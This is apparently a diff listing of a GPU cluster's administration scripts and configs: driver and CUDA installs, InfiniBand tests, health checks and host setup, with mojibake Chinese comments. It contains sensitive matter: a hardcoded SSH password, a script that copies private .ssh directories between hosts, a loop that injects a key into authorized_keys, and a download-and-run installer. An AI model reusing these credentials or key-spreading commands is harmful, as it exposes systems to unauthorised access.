-RW_MODES=("write" "read" "rw" "randread" "randwrite" "randrw")
-
-# è¾“å‡ºæ–‡ä»¶
-OUTPUT_FILE="fio_results.log"
-
-# æ¸…ç©ºè¾“å‡ºæ–‡ä»¶ï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰
-> $OUTPUT_FILE
-
-# å¾ªç¯æ¯ç§å—å¤§å°
-for BS in "${BLOCK_SIZES[@]}"; do
-  # å¾ªç¯æ¯ç§å¹¶å‘ä»»åŠ¡æ•°
-  for NUMJOBS in "${NUMJOBS_VALUES[@]}"; do
-    # å¾ªç¯æ¯ç§I/Oæ¨¡å¼
-== /root/conf/full-comfile.sh
-#!/usr/bin/env bash
-
-# é‡åˆ°é”™è¯¯æ—¶ç«‹å³é€€å‡ºè„šæœ¬
-set -e
-
-# è„šæœ¬æ‰€åœ¨ç›®å½•ä½œä¸ºå®‰è£…æ ¹ç›®å½•
-BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
-
-# è®¾ç½®å˜é‡
-CUDA_VERSION="12.8.0"
-CUDA_INSTALLER="cuda_${CUDA_VERSION}_570.86.10_linux.run"
-CUDA_PATH="$BASE_DIR/cuda/${CUDA_VERSION}"
-CUDA_FILE_PATH="$BASE_DIR/${CUDA_INSTALLER}"
-OPENMPI_VERSION="4.1.1" 
-OPENMPI_TAR="openmpi-${OPENMPI_VERSION}.tar.gz"
-OPENMPI_PATH="$BASE_DIR/openmpi"
-NCCL_REPO="https://gitee.com/mrzhoujingyu/nccl.git"
-NCCL_TESTS_REPO="https://gitee.com/mrzhoujingyu/nccl-tests.git"
-GPU_BURN_REPO="https://gitee.com/mrzhoujingyu/gpu-burn.git"
-NUM_CORES=$(nproc)
-
-# è·å– GPU åç§°å¹¶æ˜ å°„åˆ°æ¶æ„
-GPU_NAME=$(nvidia-smi --query-gpu=name --format=csv,noheader)
-case "$GPU_NAME" in
-    *"V100"*)   GPU_ARCH="70" ;;  # Volta
-    *"H20"*)   GPU_ARCH="90" ;;  # Hopper
-    *"A100"*)  GPU_ARCH="80" ;;  # Ampere
-    *"A800"*)  GPU_ARCH="80" ;;  # Ampere
-    *"RTX 3090"*) GPU_ARCH="86" ;;  # Ampere
-    *"H100"*)  GPU_ARCH="90" ;;  # Hopper
-== /root/conf/gpu_burn
-== /root/conf/gpu_lspci_info.sh
-#!/bin/bash
-
-# è·å– GPU çš„ Bus ID
-bus_ids=$(nvidia-smi --query-gpu=gpu_bus_id --format=csv,noheader)
-
-# å¾ªç¯éå†æ¯ä¸ª Bus ID å¹¶æŸ¥çœ‹è¯¦ç»†çš„ lspci ä¿¡æ¯
-for bus_id in $bus_ids; do
-    echo "ä¿¡æ¯ for Device (Bus ID: $bus_id):"
-    sudo lspci -vvv -s ${bus_id//00000000:} | grep -E "LnkCap|LnkSta"
-    echo "--------------------------"
-done
-== /root/conf/grub.sh
-#!/bin/bash
-sudo mkdir -p /etc/needrestart/conf.d
-cat <<EOF | sudo tee /etc/needrestart/conf.d/99-noninteractive.conf >/dev/null
-\$nrconf{restart} = 'a';
-\$nrconf{kernelhints} = 0;
-\$nrconf{verbosity} = 0;
-EOF
-# è·å–å½“å‰å†…æ ¸ç‰ˆæœ¬
-kernel_version=$(uname -r)
-
-# è¦ä¿®æ”¹çš„GRUBé…ç½®æ–‡ä»¶è·¯å¾„
-grub_config="/etc/default/grub"
-
-# æ£€æŸ¥ç¬¬6è¡Œæ˜¯å¦åŒ…å« GRUB_DEFAULT=
-if grep -q "^GRUB_DEFAULT=" "$grub_config"; then
-    # æ£€æŸ¥ç¬¬6è¡Œæ˜¯å¦æ˜¯GRUB_DEFAULT=å¼€å¤´
-    current_grub_default=$(sed -n '6p' "$grub_config")
-    if [[ "$current_grub_default" == GRUB_DEFAULT=* ]]; then
-        # ä½¿ç”¨sedå‘½ä»¤æ›¿æ¢ç¬¬6è¡Œçš„GRUB_DEFAULTå€¼ä¸ºæ–°çš„å†…æ ¸ç‰ˆæœ¬
-        sudo sed -i "6s|^GRUB_DEFAULT=.*|GRUB_DEFAULT=\"Advanced options for Ubuntu>Ubuntu, with Linux $kernel_version\"|" $grub_config
-        # æ›´æ–° grub é…ç½®
-        sudo update-grub
-        echo "å†…æ ¸ç‰ˆæœ¬å·²æ›´æ–°åˆ°GRUBé…ç½®ä¸­ï¼Œå½“å‰å†…æ ¸ç‰ˆæœ¬ï¼š$kernel_version"
-    else
-        echo "ç¬¬6è¡Œä¸ç¬¦åˆé¢„æœŸæ ¼å¼ï¼Œæœªè¿›è¡Œä¿®æ”¹ã€‚"
-    fi
-else
-    echo "æ²¡æœ‰æ‰¾åˆ°GRUB_DEFAULTé…ç½®é¡¹ï¼Œæœªè¿›è¡Œä¿®æ”¹ã€‚"
-fi
-== /root/conf/h800_os_bugcollect.sh
-#!/bin/bash
-lspci -nnvv > lspci1.log
-lspci -tv > lspci2.log
-nvidia-smi > nvidia_smi.log
-nvidia-smi -a > nvidia_smi_a.log
-nvidia-smi nvlink -e > nvidia_nvlink_e.log
-dmesg -T > dmesg.log
-
-== /root/conf/h800_share_storage.sh
-apt-get install lsscsi -y
-dpkg -i leofs_mond-4.0.18-5.4_x86_64.deb
-tar zxvf Leo-rdma-clt-ubuntu-5.15.0-78-generic-x86_64-MLNXOFED5.8-2.0.3.0-20230922-1.tgz -C /LeoCluster/bin/ --strip-components 1
-/LeoCluster/bin/leofs_cfgd== /root/conf/hamiaotong_ubuntu_batch_install.sh
-#!/bin/bash
-#set -euo pipefail
-
-# ========== é…ç½® ==========
-HOSTLIST="${1:-hostlist4}"
-JOBS=8
-SCP_USER_SSH_TIMEOUT=60
-SCP_PKG_TIMEOUT=600
-SSH_EXEC_TIMEOUT=3600
-LOG_DIR="./deploy_logs"
-REMOTE_USER="ubuntu"
-
-export LOG_DIR
-export REMOTE_USER
-export PARALLEL="--no-notice"
-
-# ========== è‡ªåŠ¨å®‰è£… parallel ==========
-if ! command -v parallel >/dev/null 2>&1; then
-    echo "âš ï¸  GNU parallel æœªå®‰è£…ï¼Œæ­£åœ¨è‡ªåŠ¨å®‰è£…..."
-    if sudo -n true 2>/dev/null; then
-        sudo apt update -y >/dev/null 2>&1
-        sudo apt install -y parallel >/dev/null 2>&1
-    else
-        echo "í ½í´‘ éœ€è¦ sudo æƒé™å®‰è£… parallelï¼Œè¯·è¾“å…¥å¯†ç ï¼š"
-        sudo apt update -y
-        sudo apt install -y parallel
-    fi
-    if ! command -v parallel >/dev/null 2>&1; then
-        echo "âŒ è‡ªåŠ¨å®‰è£…å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨è¿è¡Œï¼šsudo apt install parallel"
-        exit 1
-== /root/conf/health-check-v2.sh
-#!/bin/bash
-
-CHECK_LIST(){
-    CHECK_SYSTEM(){
-        Machine_Information(){
-            echo "[ Machine_Information ]"
-            # è·å–ç³»ç»Ÿåºåˆ—å·
-            serial_number=$(dmidecode -s system-serial-number)
-
-            # è·å–ä¸»æœºå
-            host_name=$(hostname)
-
-            # è·å–eth8xçš„IPåœ°å€ï¼Œæ’é™¤inet6åœ°å€
-            ip_address=$(ip addr show ens19np0 | grep inet | grep -v inet6 | awk '{print$2}' | cut -d/ -f1)
-
-
-            # è·å–NVIDIA GPUè¯¦æƒ…å¹¶æ ¼å¼åŒ–è¾“å‡ºï¼Œç¡®ä¿æ¯è¡ŒGPUä¿¡æ¯åæœ‰é€—å·å’Œæ–°è¡Œ
-            nvidia_details=$(nvidia-smi --query-gpu=index,gpu_serial --format=csv,noheader,nounits | awk -F ',' '{if(NR>1) printf(",\n"); printf$1":"$2}')
-
-
-            # å°†æ‰€æœ‰è¯¦æƒ…åˆå¹¶æˆä¸€è¡Œï¼Œä»¥é€—å·åˆ†éš”ï¼Œå¹¶ç¡®ä¿GPUè¯¦æƒ…å‰åæœ‰åŒå¼•å·
-            echo "$serial_number,$host_name,$ip_address,\"$nvidia_details\""
-            echo "-----------------------------------------------------------------"
-
-        }
-
-        Network_Rdma_Status(){
-
-            if ibdev2netdev | grep -i down|grep -vE 'eth9x|eth10x' > /dev/null; then
-                echo -e "[ network_ibdev2netdev ] \e[31munhealth\e[0m"
-== /root/conf/health_check.sh
-#!/bin/bash
-for i in node{001..125}; do
-    {
-        echo "[$(date '+%Y-%m-%d %H:%M:%S')] Checking $i" >> /gpfs01/nccl-tests/health_check.log
-        ssh kgzs@$i "echo $i; echo \$HOSTNAME; sudo /gpfs01/glm-infra/duanshuaixing/health-check-v2.sh" >> /gpfs01/nccl-tests/health_check.log 2>&1
-    }
-done
-== /root/conf/hostlist
+### FARM-INTEL 2026-11-24T19:14:48Z
+--- /root/conf/hostlist
 g0002
 g0003
 g0004
@@ -1395,22 +8,7 @@ g0005
 g0006
 g0007
 g0008
-== /root/conf/hostname.sh
-#!/bin/bash
-
-# è¯»å–hostlistæ–‡ä»¶ä¸­çš„IPåœ°å€
-mapfile -t hosts < hostlist
-
-# è®¾ç½®åˆå§‹ä¸»æœºåç´¢å¼•
-index=2
-
-# éå†IPåœ°å€ï¼Œå¹¶ä¸ºæ¯å°ä¸»æœºè®¾ç½®æ–°çš„ä¸»æœºå
-for host in "${hosts[@]}"; do
-	new_hostname="g$(printf '%04d' "$index")"  # ç”Ÿæˆæ–°çš„ä¸»æœºåï¼Œå¦‚g0002ã€g0003ç­‰
-	ssh "$host" "sudo hostnamectl set-hostname $new_hostname;sudo systemctl restart sshd"  # é€šè¿‡SSHè¿æ¥åˆ°è¿œç¨‹ä¸»æœºï¼Œè®¾ç½®ä¸»æœºåå¹¶é‡å¯sshdæœåŠ¡
-	((index++))  # ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªä¸»æœºåç´¢å¼•
-done
-== /root/conf/hosts
+--- /root/conf/hosts
 127.0.0.1 localhost
 127.0.1.1 ubuntu
 
@@ -1436,1262 +34,7 @@ ff02::2 ip6-allrouters
 185.199.110.133 cloud.githubusercontent.com
 185.199.111.133 camo.githubusercontent.com
 185.199.111.133 avatars0.githubusercontent.com
-185.199.110.133 avatars1.githubusercontent.com
-185.199.111.133 avatars2.githubusercontent.com
-185.199.109.133 avatars3.githubusercontent.com
-185.199.108.133 avatars4.githubusercontent.com
-185.199.111.133 avatars5.githubusercontent.com
-== /root/conf/ib_test.tar
-ib_test/                                                                                            0000775 0001750 0001750 00000000000 14710354565 012151  5                                                                                                    ustar   ubuntu                          ubuntu                                                                                                                                                                                                                 ib_test/ib-2/                                                                                       0000775 0001750 0001750 00000000000 14710353204 012667  5                                                                                                    ustar   ubuntu                          ubuntu                                                                                                                                                                                                                 ib_test/ib-2/10.254.31.14-ib_atomic_bw_server.log                                                   0000664 0001750 0001750 00000207164 14710353204 020604  0                                                                                                    ustar   ubuntu                          ubuntu                                                                                                                                                                                                                 
-************************************
-* Waiting for client to connect... *
-************************************
----------------------------------------------------------------------------------------
-                    Atomic FETCH_AND_ADD BW Test
- Dual-port       : OFF		Device         : mlx5_0
- Number of qps   : 1		Transport type : IB
- Connection type : RC		Using SRQ      : OFF
- PCIe relax order: ON
- ibv_wr* API     : ON
- CQ Moderation   : 100
- Mtu             : 4096[B]
- Link type       : IB
- Outstand reads  : 16
- rdma_cm QPs	 : OFF
- Data ex. method : Ethernet
----------------------------------------------------------------------------------------
- local address: LID 0x6c QPN 0x0079 PSN 0xb75f2
- remote address: LID 0x75 QPN 0x00eb PSN 0x787522
----------------------------------------------------------------------------------------
- #bytes     #iterations    BW peak[MB/sec]    BW average[MB/sec]   MsgRate[Mpps]
- 8          1000             11.53              11.52  		   1.509538
----------------------------------------------------------------------------------------
-
-************************************
-* Waiting for client to connect... *
-************************************
----------------------------------------------------------------------------------------
-                    Atomic FETCH_AND_ADD BW Test
-== /root/conf/ib_test_log.txt
-IB Bandwidth Test Log
-======================
-Starting IB write bandwidth test from 10.11.61.2 to 10.11.61.1...
-Server output from 10.11.61.1:
-Warning: Permanently added '10.11.61.1' (ED25519) to the list of known hosts.
-
- Found Incompatibility issue with GID types.
- Please Try to use a different IP version.
-
-
-************************************
-* Waiting for client to connect... *
-************************************
----------------------------------------------------------------------------------------
-                    RDMA_Write BW Test
- Dual-port       : OFF		Device         : mlx5_0
- Number of qps   : 2		Transport type : IB
- Connection type : RC		Using SRQ      : OFF
- PCIe relax order: ON
- ibv_wr* API     : ON
- CQ Moderation   : 100
- Mtu             : 4096[B]
- Link type       : Ethernet
- GID index       : 3
- Max inline data : 0[B]
- rdma_cm QPs	 : OFF
- Data ex. method : Ethernet
----------------------------------------------------------------------------------------
-Client output from 10.11.61.2:
-
-== /root/conf/ib_write_test.sh
-#!/bin/bash
-
-# å®šä¹‰èŠ‚ç‚¹èŒƒå›´ï¼Œç”ŸæˆèŠ‚ç‚¹å†…ç½‘IPåˆ—è¡¨
-start=1
-end=8
-node=()
-for i in $(seq $start $end); do
-    node="10.11.61.$i"
-    nodes+=($node)
-done
-#nodes=(g0002 g0003 g0004 g0005 g0006 g0007 g0008 g0009 g0011 g0012 g0013 g0014 g0015 g0016)
-# è®¾ç½®æµ‹è¯•å‘½ä»¤
-server_command="ib_write_bw -d mlx5_0 -x 3 -F -q 2 -a --report_gbits"
-client_command="ib_write_bw -d mlx5_0 -x 3 -F -q 2 -a --report_gbits"
-
-# æ—¥å¿—æ–‡ä»¶
-log_file="ib_test_log.txt"
-echo "IB Bandwidth Test Log" > $log_file
-echo "======================" >> $log_file
-
-# éå†èŠ‚ç‚¹ï¼Œè¿›è¡Œä¸¤ä¸¤æµ‹è¯•
-for (( i=0; i<${#nodes[@]}; i++ )); do
-    for (( j=i+1; j<${#nodes[@]}; j++ )); do
-        server_node=${nodes[i]}
-        client_node=${nodes[j]}
-
-        echo "Starting IB write bandwidth test from $client_node to $server_node..." | tee -a $log_file
-        
-        # åœ¨æœåŠ¡ç«¯èŠ‚ç‚¹ä¸Šæ‰§è¡Œå‘½ä»¤
-        ssh "$server_node" "$server_command" > server_output.txt 2>&1 &
-== /root/conf/ids.sh
-#!/bin/bash
-SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-PARENT_DIR="$(dirname "$SCRIPT_DIR")"
-
-SCRIPT_NAME="ids-bare-metal-mon-installer.gnode.ubuntu.v1.0.10.linux_amd64.sh"
-INSTALL_DIR="$PARENT_DIR/ids-bare-metal-mon-installer.gnode.ubuntu"
-
-# æ£€æŸ¥è„šæœ¬æ–‡ä»¶æ˜¯å¦å·²å­˜åœ¨
-if [ ! -f "$PARENT_DIR/$SCRIPT_NAME" ]; then
-    echo "ä¸‹è½½å®‰è£…è„šæœ¬..."
-    wget -P $PARENT_DIR "https://file.mir.blsc.cn/deploy/monitor/$SCRIPT_NAME"
-    
-    if [ $? -ne 0 ]; then
-        echo "ä¸‹è½½å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç½‘ç»œè¿æ¥å’ŒURLæ˜¯å¦æ­£ç¡®"
-        exit 1
-    fi
-else
-    echo "å®‰è£…è„šæœ¬å·²å­˜åœ¨ï¼Œè·³è¿‡ä¸‹è½½"
-fi
-
-# æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸä¸‹è½½æˆ–å·²å­˜åœ¨
-if [ -f "$PARENT_DIR/$SCRIPT_NAME" ]; then
-    chmod +x "$PARENT_DIR/$SCRIPT_NAME"
-    
-    # æ‰§è¡Œå®‰è£…è„šæœ¬
-    cd $PARENT_DIR
-    ./$SCRIPT_NAME
-    
-    # æ£€æŸ¥å®‰è£…ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œç„¶åæ‰§è¡Œåç»­å‘½ä»¤
-    if [ -d "$INSTALL_DIR" ]; then
-== /root/conf/install-docker.sh
-#!/bin/bash
-set -e
-
-# å®‰è£…Docker
-sudo apt update
-sudo apt install -y apt-transport-https ca-certificates curl gnupg lsb-release
-curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -
-sudo add-apt-repository "deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable"
-sudo apt-get install -y docker-ce docker-ce-cli containerd.io
-
-# é…ç½®å­˜å‚¨è·¯å¾„
-sudo mkdir -p /zz2fs1/docker_data
-sudo chown root:root /zz2fs1/docker_data
-sudo chmod 755 /zz2fs1/docker_data
-
-# é…ç½®daemon.json
-sudo tee /etc/docker/daemon.json <<EOF
-{
-    "data-root": "/zz2fs1/docker_data",
-    "dns": [
-        "8.8.8.8",
-        "1.1.1.1"
-    ],
-    "proxies": {
-        "http-proxy": "http://10.20.32.129:3128",
-        "https-proxy": "http://10.20.32.129:3128",
-        "no-proxy": "127.0.0.1"
-    },
-    "registry-mirrors": [
-        "https://docker.gh-proxy.com"
-== /root/conf/install_all_1.sh
-#!/bin/bash
-
- #/data/apps/conf/synchosts.sh
- /data/apps/conf/disableupdate.sh
- #/data/apps/conf/ssh.sh
- /data/apps/conf/rclocal.sh
- /data/apps/conf/installpackage.sh
- /data/apps/conf/disblenouveau.sh
- reboot
-== /root/conf/install_all_2.sh
-#!/bin/bash
-
-
-#/data/apps/conf/installofed.sh
-/data/apps/conf/installnvidiadriver.sh
-== /root/conf/install_build_essential.sh
-#!/bin/bash
-export DEBIAN_FRONTEND=noninteractive
-sudo apt install aptitude -y
-# ä½¿ç”¨ echo å’Œç®¡é“ç¬¦ä¼ é€’ n, y, y ç»™ aptitude
-echo -e "n\ny\ny\n" | sudo aptitude install build-essential
-
-# æ£€æŸ¥ gcc å’Œ g++ çš„ä½ç½®
-GCC_PATH=$(which gcc)
-GPP_PATH=$(which g++)
-
-# æ‰“å°ç»“æœ
-if [[ -x "$GCC_PATH" && -x "$GPP_PATH" ]]; then
-    echo "gcc å’Œ g++ å®‰è£…æˆåŠŸã€‚"
-    echo "gcc è·¯å¾„: $GCC_PATH"
-    echo "g++ è·¯å¾„: $GPP_PATH"
-else
-    echo "gcc æˆ– g++ å®‰è£…å¤±è´¥ã€‚"
-    if [[ ! -x "$GCC_PATH" ]]; then
-        echo "æ‰¾ä¸åˆ° gccï¼Œå°è¯•é‡æ–°å®‰è£…æˆ–æ£€æŸ¥é”™è¯¯ã€‚"
-    fi
-    if [[ ! -x "$GPP_PATH" ]]; then
-        echo "æ‰¾ä¸åˆ° g++ï¼Œå°è¯•é‡æ–°å®‰è£…æˆ–æ£€æŸ¥é”™è¯¯ã€‚"
-    fi
-fi
-
-== /root/conf/installnvidiadriver.sh
-#!/bin/bash
-#set -e  # é‡åˆ°é”™è¯¯ç«‹å³é€€å‡ºï¼Œä¾¿äºæ’æŸ¥
-
-SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-PARENT_DIR="$(dirname "$SCRIPT_DIR")"
-
-# ================= é…ç½®åŒºåŸŸ =================
-# æ”¯æŒå‘½ä»¤è¡Œä¼ å‚ï¼š./installnvidiadriver.sh 580.105.08 æˆ– ./installnvidiadriver.sh 580.95.05
-# æœªä¼ å‚åˆ™ä½¿ç”¨é»˜è®¤ç‰ˆæœ¬
-DRIVER_VERSION="${1:-550.163.01}"
-UBUNTU_CODENAME="${2:-ubuntu2204}"  # æ”¯æŒä¼ å‚æŒ‡å®š Ubuntu ç‰ˆæœ¬ï¼Œé»˜è®¤ 22.04
-
-# æå–ä¸»ç‰ˆæœ¬å·ï¼ˆå¦‚ 580.105.08 -> 580ï¼Œ580.95.05 -> 580ï¼‰
-MAJOR_VERSION=$(echo "$DRIVER_VERSION" | cut -d. -f1)
-
-# ================= ç¬¬1éƒ¨åˆ†ï¼šNVIDIAé©±åŠ¨ =================
-# é©±åŠ¨ä¸‹è½½é“¾æ¥æ ¼å¼ï¼ˆæ‰€æœ‰ç‰ˆæœ¬ç»Ÿä¸€ï¼‰ï¼š
-# https://download.nvidia.com/XFree86/Linux-x86_64/{ç‰ˆæœ¬å·}/NVIDIA-Linux-x86_64-{ç‰ˆæœ¬å·}.run
-DRIVER_FILE="NVIDIA-Linux-x86_64-${DRIVER_VERSION}.run"
-DRIVER_URL="https://download.nvidia.com/XFree86/Linux-x86_64/${DRIVER_VERSION}/${DRIVER_FILE}"
-# å¤‡ç”¨ä¸‹è½½åœ°å€ï¼ˆå›½å†…é•œåƒï¼‰
-BACKUP_DRIVER_URL="https://file.mir.blsc.cn/deploy/NVIDIA/driver/${DRIVER_FILE}"
-
-# ================= ç¬¬2éƒ¨åˆ†ï¼šnvidia-fabricmanager =================
-# fabricmanager debåŒ…å‘½åè§„åˆ™ï¼š
-# - 580ä»¥ä¸‹ç‰ˆæœ¬ï¼šnvidia-fabricmanager-{ä¸»ç‰ˆæœ¬å·}_{å®Œæ•´ç‰ˆæœ¬å·}-1_amd64.deb
-#   ç¤ºä¾‹ï¼šnvidia-fabricmanager-550_550.90.07-1_amd64.deb
-# - 580åŠä»¥ä¸Šç‰ˆæœ¬ï¼šnvidia-fabricmanager_{å®Œæ•´ç‰ˆæœ¬å·}-1_amd64.deb
-#   ç¤ºä¾‹ï¼šnvidia-fabricmanager_580.105.08-1_amd64.deb
-
-== /root/conf/installofed.sh
-#!/bin/bash
-#H800é©±åŠ¨ä¸‹è½½
-#wget http://www.mellanox.com/downloads/ofed/MLNX_OFED-5.8-2.0.3.0/MLNX_OFED_LINUX-5.8-2.0.3.0-ubuntu22.04-x86_64.tgz
-#H100é©±åŠ¨ä¸‹è½½
-#wget http://www.mellanox.com/downloads/ofed/MLNX_OFED-24.04-0.7.0.0/MLNX_OFED_LINUX-24.04-0.7.0.0-ubuntu22.04-x86_64.tgz
-#æ‰¹é‡æ„å»º
-# for i in g0728 g0729 g0730 g0732; do ssh ubuntu@$i "echo \$HOSTNAME; sudo /home/ubuntu/MLNX_OFED_LINUX-24.01-0.3.3.1-ubuntu22.04-x86_64/mlnxofedinstall --add-kernel-support --skip-distro-check --force" & done
-#H800 å®‰è£…æ–¹å¼
-#sudo apt-get install lsscsi
-#sudo dpkg -i leofs_mond-4.0.18-5.4_x86_64.deb
-#tar zxvf Leo-rdma-clt-ubuntu-5.15.0-78-generic-x86_64-MLNXOFED5.8-2.0.3.0-20230922-1.tgz -C /LeoCluster/bin/ --strip-components 1
-#/LeoCluster/bin/leofs_cfgd
-tar xf MLNX_OFED_LINUX-5.8-2.0.3.0-ubuntu22.04-x86_64.tgz
-sudo /home/ubuntu/MLNX_OFED_LINUX-5.8-2.0.3.0-ubuntu22.04-x86_64/mlnxofedinstall  --add-kernel-support --skip-distro-check --force
-
-#/etc/init.d/openibd restart
-#cp /data/apps/conf/limits.conf /etc/security/limits.conf
-
-#systemctl restart opensmd
-
-== /root/conf/installpackage.sh
-#!/bin/bash
-
-
-apt-get update
-#apt-get -y reinstall dkms build-essential linux-headers-5.15.0-78-generic build-essential gcc python3 make pkg-config python3-distutils dh-python bzip2 quilt dh-autoreconf debhelper
-
-apt-get -y reinstall dkms build-essential gcc python3 make pkg-config python3-distutils dh-python bzip2 quilt dh-autoreconf debhelper linux-headers-$(uname -r)-generic
-systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target
-systemctl status sleep.target
-#dpkg --add-architecture i386
-#apt update
-#apt -y install libc6:i386
-== /root/conf/ip_hostname_to_hosts.sh
-#install ifconfig
-for i in `cat hostlist`;do (ssh $i 'echo $HOSTNAME;sudo apt install net-tools -y');done
-#start get ip and hostname,and then write to hosts
-for i in $(cat hostlist); do ssh $i 'echo $HOSTNAME; echo $(ifconfig | grep 10.250.128 | awk -F " " '\''{print $2}'\'') $(hostname) >> /share/conf/hosts';done== /root/conf/keygen.sh
-#!/bin/bash
-
-USERNAME=$1
-USER_HOME="/home/$USERNAME"
-ssh-keygen -t rsa -N '' -f $USER_HOME/.ssh/id_rsa
-cat $USER_HOME/.ssh/id_rsa.pub >> $USER_HOME/.ssh/authorized_keys
-
-# æ·»åŠ ç¯å¢ƒå˜é‡åˆ° .bashrc æ–‡ä»¶
-echo 'source /usr/share/modules/init/profile.sh' >> $USER_HOME/.bashrc
-source $USER_HOME/.bashrc
-== /root/conf/kgzs_copy_id_rsa.sh
-#!/bin/bash
-#apt-get install expect -y
-#apt install python3 python3-pip -y
-#pip3 install spawn
-# å®šä¹‰ç›®æ ‡ä¸»æœºä¿¡æ¯
-declare -a hosts=(
-  "10.100.80.5"
-  "10.100.80.6"
-  "10.100.80.7"
-  "10.100.80.8"
-)
-
-# SSHå¯†ç 
-PASSWORD="Kgzs@2024"
-
-# æ‹·è´ .ssh ç›®å½•åˆ°æ¯ä¸ªç›®æ ‡ä¸»æœº
-for ip in "${hosts[@]}"; do
-  echo "æ­£åœ¨æ‹·è´ .ssh ç›®å½•åˆ° $ip"
-  
-  expect << EOF
-set timeout 20
-spawn scp -r /home/kgzs/.ssh kgzs@$ip:/home/kgzs
-expect {
-  "yes/no" { send "yes\r"; exp_continue }
-  "password:" { send "$PASSWORD\r" }
-}
-expect eof
-EOF
-
-  if [ $? -eq 0 ]; then
-== /root/conf/kill_dpkg_apt.sh
-#!/bin/bash
-
-# æŸ¥æ‰¾ä¸ apt æˆ– dpkg ç›¸å…³çš„è¿›ç¨‹ ID
-PIDS=$(ps aux | grep -E 'apt|dpkg' | grep -v grep | awk '{print $2}')
-
-if [ -z "$PIDS" ]; then
-    echo "æ²¡æœ‰æ‰¾åˆ°ä¸ apt æˆ– dpkg ç›¸å…³çš„è¿›ç¨‹ã€‚"
-else
-    echo "æ­£åœ¨æ€æ‰ä»¥ä¸‹è¿›ç¨‹: $PIDS"
-    # æ€æ‰æ‰€æœ‰ç›¸å…³è¿›ç¨‹
-    for PID in $PIDS; do
-        sudo kill -9 $PID
-    done
-    echo "æ‰€æœ‰ç›¸å…³è¿›ç¨‹å·²ç»ˆæ­¢ã€‚"
-fi
-
-# æ¸…ç†é”æ–‡ä»¶å¹¶ä¿®å¤åŒ…ç®¡ç†
-echo "æ¸…ç†é”æ–‡ä»¶å¹¶ä¿®å¤åŒ…ç®¡ç†..."
-sudo rm -f /var/lib/dpkg/lock-frontend
-sudo rm -f /var/lib/dpkg/lock
-sudo dpkg --configure -a
-sudo apt-get install -f
-
-echo "æ“ä½œå®Œæˆã€‚"
-== /root/conf/limits.conf
-# /etc/security/limits.conf
-#
-#Each line describes a limit for a user in the form:
-#
-#<domain>        <type>  <item>  <value>
-#
-#Where:
-#<domain> can be:
-#        - a user name
-#        - a group name, with @group syntax
-#        - the wildcard *, for default entry
-#        - the wildcard %, can be also used with %group syntax,
-#                 for maxlogin limit
-#        - NOTE: group and wildcard limits are not applied to root.
-#          To apply a limit to the root user, <domain> must be
-#          the literal username root.
-#
-#<type> can have the two values:
-#        - "soft" for enforcing the soft limits
-#        - "hard" for enforcing hard limits
-#
-#<item> can be one of the following:
-#        - core - limits the core file size (KB)
-#        - data - max data size (KB)
-#        - fsize - maximum filesize (KB)
-#        - memlock - max locked-in-memory address space (KB)
-#        - nofile - max number of open file descriptors
-#        - rss - max resident set size (KB)
-#        - stack - max stack size (KB)
-#        - cpu - max CPU time (MIN)
-== /root/conf/mianmi.txt
-#å¯¹äºérootè´¦å·ï¼Œä¸”æœ‰sudoæƒé™çš„é€‚ç”¨ã€‚
-for i in g0047 g0048 g0049; do ssh $i 'echo $HOSTNAME; sudo su - ubuntu -c "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCblZcdjQO0mnWs7oZZdzlNAQHD8ens10xt8ZpXTDCwIOJrf/fzy/mfLwojGY4jDm1P3euqPD2/niTKlvjSaL+L2HsVhoKzH4TQgjQmH3SgGqaHvhOs4wzHl8PYDNh9PJ1oy3y8c5JJHPF3maaJEVSXUVHCCr3Aw0z/NKhuf+x257QGppIqYV/Z45zK9VWt+oZOessH9rNHVHxQrdkMs0KgyVtzC331I+2DNaACwCD0SHiiTdUeqpB3rrjBKSPdBRkQOwDDqkltE55D/d74KjlCnU0TcsClFeQ8QOlkpm+z3f5aggES+Kdc04J+ImA6wGYJbVDTvnAzybDP5R5Th3SUd1hRt41BpMSU6tTYhGgKTYTQQJGNn46mAwiYUjUgrRuArPT4V3XPXidhGmAml57nGysPFyPdPlV2uGWs+wJmiNwfpgpzdfUM8EVL4Twzb+nr3gAZhOzrdS3qQ/Uo+t4PCVH6uXHo1wHrbJJp+GPDfVp9zSANt7+pj4b6oJqJkAc= langboat@m005\" >> ~/.ssh/authorized_keys" '; done== /root/conf/module.sh
-#!/bin/bash
-apt-get install environment-modules -y
-echo "/data/apps/modulefiles"  >> /usr/share/modules/init/.modulespath
-source /usr/share/modules/init/profile.sh
-== /root/conf/modulefiles
-== /root/conf/monitor_nvlink.sh
-#!/bin/bash
-non_root_servers=("10.254.45.33")
-#root_servers=("172.16.10.25")
-username=$(whoami)
-for i in "${non_root_servers[@]}"; do
-  ssh -i /home/$username/.ssh/id_rsa $username@$i '
-    echo $HOSTNAME;
-    export package_dir=/data/apps/monitor;
-    cd $package_dir;
-    sudo tar xf prometheus.tar.gz -C /opt/monitor;
-    sudo dpkg -i datacenter-gpu-manager_3.3.8_amd64.deb;
-    sudo cp dcp-metrics-all.csv /etc;
-    sudo dpkg -i dcgm_exporter_3.3.8_amd64.deb;
-    sudo dpkg -i node_exporter_1.8.2-amd64.deb;
-    sudo systemctl status node_exporter;
-    sudo systemctl enable node_exporter;
-    sudo systemctl status dcgm_exporter;
-    sudo systemctl enable dcgm_exporter
-  ';
-done
-
-
-for i in "${root_servers[@]}"; do
-  ssh -i /root/.ssh/id_rsa root@$i '
-    echo $HOSTNAME;
-    export package_dir=/data/apps/monitor;
-    cd $package_dir;
-    tar xf prometheus.tar.gz -C /opt/monitor;
-    dpkg -i datacenter-gpu-manager_3.3.8_amd64.deb;
-    cp dcp-metrics-all.csv /etc;
-== /root/conf/monitor_pcie.sh
-#!/bin/bash
